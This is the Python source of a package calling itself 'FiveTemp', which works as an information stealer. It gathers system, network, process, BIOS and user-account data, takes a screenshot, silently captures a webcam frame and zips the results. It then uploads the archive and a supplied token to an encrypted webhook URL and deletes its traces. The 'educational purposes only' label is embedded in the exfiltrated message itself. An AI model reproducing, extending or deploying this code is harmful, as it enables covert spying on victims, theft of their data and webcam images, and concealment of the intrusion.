import requests
import platform
import subprocess
import os
import json
from .encrypt import decrypt
import cv2
import pyautogui
import zipfile
import logging

logging.basicConfig(level=logging.DEBUG)

token = ''

def get_pc_info():
    info = {
        'System': platform.system(),
        'Node': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor()
    }
    return info

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        return result.stdout
    except Exception as e:
        return str(e)

def save_file(filename, content):
    with open(filename, 'w') as file:
        file.write(content)

def delete_files(*files):
    for file in files:
        try:
            os.remove(file)
        except FileNotFoundError:
            pass
        except PermissionError:
            pass

def take_screenshot():
    image = pyautogui.screenshot()
    image.save('screenshot.png')

def take_camera_screenshot():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if not ret or frame is None:
            return None
        if frame.size == 0:
            return None
        cv2.imwrite('camera_screenshot.png', frame)
        cap.release()
        return 'camera_screenshot.png'
    except Exception as e:
        return None

def s(encrypted_webhook):
    webhook_url = decrypt(encrypted_webhook)
    
    try:
        pc_info = get_pc_info()

        ipinfo = run_command('ipconfig')
        sysinfo = run_command('systeminfo')
        netstat = run_command('netstat -an')
        tasklist = run_command('tasklist')
        gpu_info = run_command('wmic path win32_VideoController get name')
        bios_info = run_command('wmic bios get serialnumber')
        os_info = run_command('wmic os get caption')
        user_info = run_command('wmic useraccount get name')

        save_file('ip.txt', ipinfo)
        save_file('sysinfo.txt', sysinfo)
        save_file('netstat.txt', netstat)
        save_file('tasklist.txt', tasklist)
        save_file('gpu_info.txt', gpu_info)
        save_file('bios_info.txt', bios_info)
        save_file('os_info.txt', os_info)
        save_file('user_info.txt', user_info)

        take_screenshot()
        camera_screenshot = take_camera_screenshot()

        files = [
            'ip.txt',
            'sysinfo.txt',
            'netstat.txt',
            'tasklist.txt',
            'gpu_info.txt',
            'bios_info.txt',
            'os_info.txt',
            'user_info.txt',
            'screenshot.png'
        ]

        if camera_screenshot:
            files.append(camera_screenshot)

        zip_file = zipfile.ZipFile('info.zip', 'w')
        for file in files:
            zip_file.write(file)
        zip_file.close()

        file = open('info.zip', 'rb')
        zipped_files = {'file': ('info.zip', file)}

        embed = {
            "embeds": [
                {
                    "title": "5T | @abyzmzs yt",
                    "description": "FiveTemp (5T) is a Python package designed for educational purposes. It collects system information and sends it. FiveTemp is solely for educational purposes only. If you want to request a feature for the next update, feel free to let me know at my [YouTube](https://www.youtube.com/@abyzmzs). Credits to reckedpr for helping out with the logger.",
                    "color": 0x6a0dad,
                    "fields": [
                        {"name": "System", "value": pc_info['System'], "inline": True},
                        {"name": "Node", "value": pc_info['Node'], "inline": True},
                        {"name": "Release", "value": pc_info['Release'], "inline": True},
                        {"name": "Version", "value": pc_info['Version'], "inline": True},
                        {"name": "Machine", "value": pc_info['Machine'], "inline": True},
                        {"name": "Processor", "value": pc_info['Processor'], "inline": True},
                        {"name": "Token", "value": token, "inline": False}
                    ]
                }
            ]
        }
        
        logging.debug('progressing')
        response = requests.post(
            webhook_url,
            data={"payload_json": json.dumps(embed)},
            files=zipped_files
        )
        logging.debug('work')
        response.raise_for_status()
        
        file.close()
        for file in files:
            delete_files(file)

        delete_files('info.zip')

    except Exception as e:
        logging.error('Error: %s', e)
        with open('error.log', 'a') as file:
            file.write(str(e) + '\n')
        for file in files:
            delete_files(file)

    finally:
        os.system('cls' if os.name == 'nt' else 'clear')

def st(encrypted_webhook, token_value):
    global token
    token = token_value
    s(encrypted_webhook)